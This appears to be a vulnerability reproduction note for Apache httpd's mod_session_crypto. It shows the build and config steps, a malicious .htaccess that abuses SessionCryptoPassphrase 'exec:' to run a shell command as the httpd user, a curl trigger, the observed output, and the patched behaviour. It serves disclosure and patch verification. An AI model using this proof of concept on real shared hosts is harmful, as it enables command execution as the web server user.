# 029 — SessionCryptoPassphrase exec: from .htaccess

`mod_session_crypto` registers `SessionCryptoPassphrase` with `OR_AUTHCFG`
and supports `exec:<command>` syntax, so a writable `.htaccess` plus
`AllowOverride AuthConfig` lets an attacker run a local command as the
httpd user when the directory is parsed.

## Setup

Build httpd with mod_session_crypto:

```bash
./configure --prefix=$PWD/inst \
    --enable-session --enable-session-crypto \
    --with-crypto
make -j && make install
```

`httpd.conf` snippet — the realistic shared-hosting setup that delegates
auth configuration to directory owners:

```apache
LoadModule session_module         modules/mod_session.so
LoadModule session_crypto_module  modules/mod_session_crypto.so

DocumentRoot "/srv/sites"

<Directory "/srv/sites">
    AllowOverride AuthConfig
    Require all granted
</Directory>
```

Attacker user `mallory` owns the document root and can write `.htaccess`:

```bash
useradd -m mallory
mkdir -p /srv/sites/mallory
chown mallory:mallory /srv/sites/mallory
```

## Trigger

As `mallory`, drop a malicious `.htaccess` whose `SessionCryptoPassphrase`
value asks the directive handler to execute a chosen program. The handler
calls `apr_tokenize_to_argv` then `ap_get_exec_line` -> `apr_proc_create`:

```bash
sudo -u mallory tee /srv/sites/mallory/.htaccess <<'EOF'
SessionCryptoPassphrase "exec:/bin/sh -c 'id > /tmp/pwned-$$; chmod 644 /tmp/pwned-$$'"
EOF
```

Force the directory to be parsed by issuing any request that resolves into
that directory:

```bash
curl -v http://127.0.0.1:8080/mallory/
```

(no specific URI is needed — the per-directory `.htaccess` walk on the
first request through that directory triggers it).

## Observed effect

Unpatched:

```bash
ls -l /tmp/pwned-*
# -rw-r--r-- 1 www-data www-data 49 ...
cat /tmp/pwned-*
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The command ran as the httpd user before the request was even authorized.
The HTTP response itself may be a normal 200/404 — the side effect on
`/tmp` is the proof.

Patched: the directive registration drops `OR_AUTHCFG`, so the same
`.htaccess` produces:

```text
[Wed ...] [core:alert] AH00529: /srv/sites/mallory/.htaccess: \
  SessionCryptoPassphrase not allowed here
```

and no command is executed.

## Notes

Reachability does not require authentication or any specific URL — only
that the per-directory configuration is walked. Any of `Options`, `<Files>`,
authentication challenges, or simple `GET`s suffice. The execution happens
in the directive parsing path before request handlers run.
